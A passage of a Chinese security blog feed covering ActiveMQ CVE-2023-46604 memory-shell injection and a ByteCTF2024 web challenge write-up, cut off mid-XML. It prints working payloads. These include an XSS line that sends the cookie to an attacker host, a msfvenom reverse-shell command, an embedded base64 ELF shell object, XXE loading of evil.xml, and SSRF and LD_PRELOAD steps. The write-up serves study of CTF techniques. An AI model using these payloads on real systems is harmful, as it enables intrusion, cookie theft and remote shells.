class="hljs-number">0</span>;            <span class="hljs-keyword">while</span> ((read = inputStream.read()) != -<span class="hljs-number">1</span>)&#123;                byteArrayOutputStream.write(read);            &#125;            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteArrayOutputStream.toByteArray());        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            result = e.getMessage();        &#125;<span class="hljs-comment">//利用socket回显</span>        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> Thread.currentThread();            Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.Thread&quot;</span>);            <span class="hljs-type">Field</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);            target.setAccessible(<span class="hljs-literal">true</span>);            org.apache.activemq.transport.tcp.<span class="hljs-type">TcpTransport</span> <span class="hljs-variable">transport</span> <span class="hljs-operator">=</span> (org.apache.activemq.transport.tcp.TcpTransport)target.get(thread);            Class&lt;?&gt; aClass1 = Class.forName(<span class="hljs-string">&quot;org.apache.activemq.transport.tcp.TcpTransport&quot;</span>);            <span class="hljs-type">Field</span> <span class="hljs-variable">socketfield</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;socket&quot;</span>);            socketfield.setAccessible(<span class="hljs-literal">true</span>);            java.net.<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span>(java.net.Socket) socketfield.get(transport);            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();            outputStream.write(<span class="hljs-string">&quot;\n&quot;</span>.getBytes());            outputStream.write(result.getBytes());            outputStream.close();        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;        &#125;    &#125;&#125;</code></pre></div><h2 id="能访问-admin才可以的内存马注入"><a href="#能访问-admin才可以的内存马注入" class="headerlink" title="能访问&#x2F;admin才可以的内存马注入"></a>能访问&#x2F;admin才可以的内存马注入</h2><p>出网加载xml，内容为内存马而不是反弹shell</p><p>activemq中间件是jetty，然后遍历线程</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:spring</span>=<span class="hljs-string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">ignore-resource-not-found</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">ignore-unresolvable</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span></span><span class="language-xml"></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ClassBase64Str&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;yv66vgAAADQBuQoAVADvBwDwCwDxAPIIAPMKAPQ..........&quot;</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span>  <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;MemshellInject1&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test1()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span></code></pre></div><p>MemshellInject1看上面的github</p><h2 id="利用IniEnvironment打回显马"><a href="#利用IniEnvironment打回显马" class="headerlink" title="利用IniEnvironment打回显马"></a>利用IniEnvironment打回显马</h2><p><a href="https://github.com/Arlenhiack/ActiveMQ-RCE-Exploit/tree/main">Arlenhiack&#x2F;ActiveMQ-RCE-Exploit: ActiveMQ RCE (CVE-2023-46604) 回显利用工具 (github.com)</a></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172005930.png" alt="image-20240927172005930"></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172129435.png" alt="image-20240927172129435"></p><p>就是把ClassPathXmlApplicationContext替换为IniEnvironment</p><p>然后内容为</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><span class="hljs-attr">bs</span> = org.apache.activemq.util.ByteSequence<span class="hljs-attr">message</span> = org.apache.activemq.command.ActiveMQObjectMessage<span class="hljs-attr">bs.data</span> = rO0ABXNyABdqYXZh.....<span class="hljs-attr">bs.length</span> = <span class="hljs-number">1376</span><span class="hljs-attr">bs.offset</span> = <span class="hljs-number">0</span><span class="hljs-attr">message.content</span> = <span class="hljs-variable">$bs</span><span class="hljs-attr">message.trustAllPackages</span> = <span class="hljs-literal">true</span><span class="hljs-attr">message.object.x</span> = x</code></pre></div><p>cb链打的回显马需要使用到socket</p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174306349.png" alt="image-20240927174306349"></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174321474.png" alt="image-20240927174321474"></p><p>嗯嗯，就这样</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>先通过有回显exp读取<code>conf/jetty-realm.properties</code>文件，找到admin的账户密码</p><p>能够登陆后就可以打入内存马</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://www.bmth666.cn/2024/09/25/ActiveMQ-CVE-2023-46604-%E4%B8%8D%E5%87%BA%E7%BD%91RCE/">ActiveMQ CVE-2023-46604 不出网RCE | Bmth’s blog (bmth666.cn)</a></p><p><a href="https://github.com/Arlenhiack/ActiveMQ-RCE-Exploit/tree/main">Arlenhiack&#x2F;ActiveMQ-RCE-Exploit: ActiveMQ RCE (CVE-2023-46604) 回显利用工具 (github.com)</a></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>有点绕，好乱</p><p>如果可以通过socket进行回显，那么为什么还要把他弄为xml文件，既然都是xml那就是要出网的</p><p>还有内存马如果不出网的话咋加载xml呢</p><p>？不太理解</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ByteCTF2024-web</title>
    <link href="/2024/09/25/ByteCTF2024-web/"/>
    <url>/2024/09/25/ByteCTF2024-web/</url>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2024–web"><a href="#ByteCTF2024–web" class="headerlink" title="ByteCTF2024–web"></a>ByteCTF2024–web</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>服了，web这么多go，根本不会go</p><p><img src="/../images/ByteCTF2024-web/image-20240925054651822.png" alt="image-20240925054651822"></p><h2 id="CrossVue"><a href="#CrossVue" class="headerlink" title="CrossVue"></a>CrossVue</h2><p>主要还是对go不熟悉，读代码花了很长时间</p><p>但其实就是一个非常简单的<code>xss</code>带出<code>admin</code>的cookie</p><p>chromedp模拟admin访问</p><div class="code-wrapper"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Invite</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;user, err := middleware.GetUserFromSession(c)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;c.HTML(http.StatusInternalServerError, <span class="hljs-string">&quot;login.html&quot;</span>, gin.H&#123;<span class="hljs-string">&quot;Error&quot;</span>: <span class="hljs-string">&quot;Failed to get user information.&quot;</span>,&#125;)<span class="hljs-keyword">return</span>&#125;url := <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>loginURL := url + <span class="hljs-string">&quot;/login&quot;</span>viewURL := url + <span class="hljs-string">&quot;/view?uuid=&quot;</span> + user.UUIDactx, acancel := chromedp.NewExecAllocator(context.Background())<span class="hljs-keyword">defer</span> acancel()ctx, cancel := chromedp.NewContext(actx,chromedp.WithLogf(log.Printf),)<span class="hljs-keyword">defer</span> cancel()ctx, cancel = context.WithTimeout(ctx, <span class="hljs-number">30</span>*time.Second)<span class="hljs-keyword">defer</span> cancel()err = chromedp.Run(ctx,chromedp.Navigate(loginURL),chromedp.WaitVisible(<span class="hljs-string">`div.login-container`</span>, chromedp.ByQuery),chromedp.SendKeys(<span class="hljs-string">`//div[contains(@class, &quot;form-container&quot;)]//input[@type=&quot;text&quot;]`</span>, <span class="hljs-string">&quot;admin&quot;</span>, chromedp.BySearch),chromedp.SendKeys(<span class="hljs-string">`//div[contains(@class, &quot;form-container&quot;)]//input[@type=&quot;password&quot;]`</span>, config.Secret.AdminPassword, chromedp.BySearch),chromedp.Click(<span class="hljs-string">`//button[contains(., &#x27;Login&#x27;)]`</span>, chromedp.BySearch),chromedp.WaitVisible(<span class="hljs-string">`div.profile`</span>, chromedp.ByQuery),)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;log.Printf(<span class="hljs-string">&quot;Failed to login: %v&quot;</span>, err)&#125;err = chromedp.Run(ctx,chromedp.Navigate(viewURL),chromedp.WaitVisible(<span class="hljs-string">`div.profile`</span>, chromedp.ByQuery),)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;log.Printf(<span class="hljs-string">&quot;Failed to navigate to view: %v&quot;</span>, err)&#125;c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Send invite successful&quot;</span>&#125;)&#125;</code></pre></div><p>admin会访问注册用户的信息</p><div class="code-wrapper"><pre><code class="hljs go">err = chromedp.Run(ctx,chromedp.Navigate(viewURL),chromedp.WaitVisible(<span class="hljs-string">`div.profile`</span>, chromedp.ByQuery),)</code></pre></div><p>而注册时只有profile可控</p><div class="code-wrapper"><pre><code class="hljs go">usernameRegex := regexp.MustCompile(<span class="hljs-string">`^[a-zA-Z0-9_]&#123;3,12&#125;$`</span>)passwordRegex := regexp.MustCompile(<span class="hljs-string">`^[a-zA-Z0-9_]&#123;8,&#125;$`</span>)profileRegex := regexp.MustCompile(<span class="hljs-string">`^.&#123;0,80&#125;$`</span>)</code></pre></div><p>所以在profile输入payload即可</p><p>思路很清晰，但是我没做出来</p><p>因为要使用vue的模板渲染符<code>&#123;&#123;&#125;&#125;</code>进行包裹才能成功执行</p><p>本地使用下面payload可以带出cookie</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&lt;<span class="hljs-name">script</span>&gt;fetch(<span class="hljs-name">&quot;http://ip:port/?&quot;</span>+btoa(<span class="hljs-name">document.cookie</span>))&lt;/script&gt;&#125;&#125;</span></code></pre></div><p>但是看了下其他的payload，好像说不能有&lt;&gt;啥的</p><div class="code-wrapper"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">fetch</span>(`<span class="hljs-name">http:</span>//&lt;SERVER_ADDR&gt;/?$&#123;document.cookie&#125;`) &#125;&#125;</span></code></pre></div><h2 id="ezoldbuddy"><a href="#ezoldbuddy" class="headerlink" title="ezoldbuddy"></a>ezoldbuddy</h2><p>nginx绕过</p><p><img src="/../images/ByteCTF2024-web/17272060340004.png" alt="img"></p><p><img src="/../images/ByteCTF2024-web/17272060339971.png" alt="img"></p><p><img src="/../images/ByteCTF2024-web/17272060339982.png" alt="img"></p><p>不管够不够钱都是404</p><p>与第一步同样绕过</p><p><img src="/../images/ByteCTF2024-web/17272060339983.png" alt="img"></p><p>qty加上<code>.0</code>即可（数量大一点）</p><p>其他的payload都是重复qty属性</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;orderId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;cart&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;qty&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;qty&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">101</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h2 id="OnlyBypassMe"><a href="#OnlyBypassMe" class="headerlink" title="OnlyBypassMe"></a>OnlyBypassMe</h2><p>扫目录，扫到&#x2F;swagger-ui&#x2F;index.html，能用的api都要登录</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>注册一个账号，但是role_id是4，有一个updatePermission接口能够更新权限</p><p>把自己权限设置为1，发现不让设置，roles_id直接设置为01，然后再重新登录就可以通过接口获取flag了</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>updateAvatarV1接口有个url参数，正常来说是上传图片</p><p>存在一个ssrf</p><p>使用file协议并且用<code>#.jpg</code>绕过后缀，然后使用getUserAvatar能读取内容</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,base64,timeurl = <span class="hljs-string">&#x27;http://5361610a.clsadp.com&#x27;</span>session = requests.session() session.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/api/v1/users/register&#x27;</span>,json=&#123;   <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;unk&quot;</span>,   <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,   <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;ABCabc123$&quot;</span>,   <span class="hljs-string">&quot;confirmPassword&quot;</span>: <span class="hljs-string">&quot;ABCabc123$&quot;</span> &#125;)cookies = &#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;C58B6BF3A6FF923FF4C31764799AA20B&#x27;</span>&#125;res = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/api/v1/users/updateAvatarV1&#x27;</span>,json=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;file:///var/lib/mysql/byteCTF/flag.ibd#.png&quot;</span>&#125;,cookies=cookies)res = requests.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/api/v1/users/getUserAvatar&#x27;</span>,cookies=cookies)data = base64.b64decode(res.json()[<span class="hljs-string">&#x27;data&#x27;</span>])<span class="hljs-comment"># print(data)</span><span class="hljs-keyword">import</span> re<span class="hljs-built_in">print</span>(re.findall(<span class="hljs-string">b&#x27;ByteCTF\&#123;.*\&#125;&#x27;</span>,data))</code></pre></div><p>最后能找到<code>flag.ibd</code></p><h2 id="ezobj"><a href="#ezobj" class="headerlink" title="ezobj"></a>ezobj</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>);<span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>] === <span class="hljs-variable">$secret</span>) &#123;        <span class="hljs-title function_ invoke__">array_map</span>(function(<span class="hljs-variable">$file</span>) &#123; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> . <span class="hljs-string">&quot;\n&quot;</span>; &#125;, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;/tmp/*&#x27;</span>));        <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>].<span class="hljs-string">&quot;.so&quot;</span>);    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;byte&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;      <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;byte&#x27;</span>]);    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);    <span class="hljs-comment">// echo $b;</span>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;clean&#x27;</span>]))&#123;    <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;unlink&#x27;</span>, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;/tmp/*&#x27;</span>));&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hello ByteCTF2024!&#x27;</span>;&#125;<span class="hljs-comment">// phpinfo.html </span>Hello ByteCTF2024!</code></pre></div><p>主要就是原生类的利用</p><p>考点两个，知道$secret是什么，如何上传so文件</p><p>读phpinfo能够知道<code>libxml</code>和<code>Imagick</code></p><p>能够使用SimpleXMLElement进行XXE读取文件</p><p><img src="/../images/ByteCTF2024-web/image-20240925035437799.png" alt="image-20240925035437799"></p><p>要使第三个参数为true才可以</p><div class="code-wrapper"><pre><code class="hljs asciidoc">?byte=SimpleXMLElement&amp;ctf[0]=<span class="hljs-link">http://vps-ip/evil.xml&amp;ctf</span>[<span class="hljs-string">1</span>]=2&amp;ctf[2]=true</code></pre></div><p>我个人做题时就是没注意到这一点，就一直读不出来</p><p>拿到的 $secret &#x3D; “HelloByteCTF2024” </p><p>然后就是<code>Imagick</code>的利用，这个之前也遇到过</p><p><a href="https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/">https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/</a></p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data:text/8BIM;base64,base64数据&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;8BIM:/tmp/xxx&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></code></pre></div><p>使用msf生成木马</p><div class="code-wrapper"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=vps_ip <span class="hljs-attribute">lport</span>=7777 -f elf-so -o 1.so</code></pre></div><p><img src="/../images/ByteCTF2024-web/image-20240925040358760.png" alt="image-20240925040358760"></p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?byte=Imagick&amp;ctf[0]=vid:msl:/tmp/php*</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>70b31e79.clsadp.com<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1037<span class="language-xml">------WebKitFormBoundaryTrWYaXKoVR1wiLhP</span><span class="language-xml">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;vulhub.msl&quot;</span><span class="language-xml">Content-Type: text/plain</span><span class="language-xml"></span><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span></span><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data:text/8BIM;base64,f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAACAEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAIAAAAAAACWAgAAAAAAAAAQAAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAAAAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAAAACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAJ+wiCGLxRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g==&quot;</span>/&gt;</span></span><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;8BIM:/tmp/1.so&quot;</span> /&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span></span><span class="language-xml">------WebKitFormBoundaryTrWYaXKoVR1wiLhP--</span></code></pre></div><p>然后使LD_PRELOAD指向1.so就可以拿到shell</p><p>然后看别人的WP，flag在redis中</p><p>配置文件能拿到密码<code>bytectfa0d90b</code></p><p>redis module提权，把exp.so文件通过上面方式同样上传</p><p><img src="/../images/ByteCTF2024-web/image-20240925041354899.png" alt="image-20240925041354899"></p><h2 id="ezauth"><a href="#ezauth" class="headerlink" title="ezauth"></a>ezauth</h2><p><a href="https://blog.wm-team.cn/index.php/archives/81/#ezauth">ByteCTF 2024 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p><h3 id="go-saml"><a href="#go-saml" class="headerlink" title="go-saml"></a>go-saml</h3><p>构造SamlResponse，获取token</p><p>拿gpt去生成，但是过不了verify，缺少证书</p><p>看看大吉北的WP</p><p>首先过 SAMLResponse 的检测，go-saml 底层调的是 xmlsec1，理论上是存在一个 CVE-2023-48703 的，就是虽然指定了 –pubkey-dem，xml 里边有证书的话还是可以用里面那个验证的，也就是说只需要找一个能默认通过 X509_verify_cert 的证书，自己签 response 即可。</p><p>找了老半天，由于 xmlsec1 sign 出来的玩意没有中间证书链，要直接从内置的 CA 签一个来的话，又好像没办法。然后试了一下发现<strong>连续放两个 samlsig:X509Certificate 进去</strong>，是**能正常 xmlsec1 verify **的，所以随便整个 LE 啥的搭网站生成的证书签一下，这就解决了 &#x2F;acs 路由的验证，拿到 random_code 跟一个 guest 的 JWT。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">samlp:Response</span> <span class="hljs-attr">xmlns:samlp</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span> <span class="hljs-attr">xmlns:saml</span>=<span class="hljs-string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="hljs-attr">xmlns:samlsig</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span> <span class="hljs-attr">Destination</span>=<span class="hljs-string">&quot;http://localhost:8000/saml_consume&quot;</span> <span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;_b38d8561-d69f-48bf-77a5-783da9328792&quot;</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">IssueInstant</span>=<span class="hljs-string">&quot;2024-09-21T06:23:13.437230381Z&quot;</span> <span class="hljs-attr">InResponseTo</span>=<span class="hljs-string">&quot;abc&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">saml:Issuer</span>&gt;</span>http://localhost:8000/saml_consume<span class="hljs-tag">&lt;/<span class="hljs-name">saml:Issuer</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:Signature</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;_96c8ed02-c1ee-4322-4233-845ccdead67d&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:SignedInfo</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:CanonicalizationMethod</span> <span class="hljs-attr">Algorithm</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:SignatureMethod</span> <span class="hljs-attr">Algorithm</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;</span>/&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:Reference</span> <span class="hljs-attr">URI</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:Transforms</span>&gt;</span>                    <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:Transform</span> <span class="hljs-attr">Algorithm</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:Transforms</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:DigestMethod</span> <span class="hljs-attr">Algorithm</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;</span>/&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">samlsig:DigestValue</span>&gt;</span>cPCj+ZmNWg+ADY/LiFH88+s/da0=<span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:DigestValue</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:Reference</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">samlsig:SignedInfo</span>&gt;</span>        <span 